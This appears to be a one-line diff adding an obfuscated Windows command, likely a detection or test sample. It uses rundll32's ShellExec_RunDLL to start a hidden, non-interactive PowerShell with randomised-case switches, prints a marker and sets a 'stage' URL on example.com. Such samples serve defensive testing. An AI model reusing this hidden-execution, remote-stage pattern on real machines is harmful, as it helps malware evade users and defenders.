@@ -1,0 +1,1 @@
+﻿c:\wINdOWs\system32\rUndLl32.exe   SHELL32.DLL,ShellExec_RunDLL "POWershell" " -nONIntera " "  -WiNdOwSTyLe hIDDeN  " " -NOp  "      "Write-Host 'corvus marker'; $u = 'http://example.com/corvus/stage.txt'"
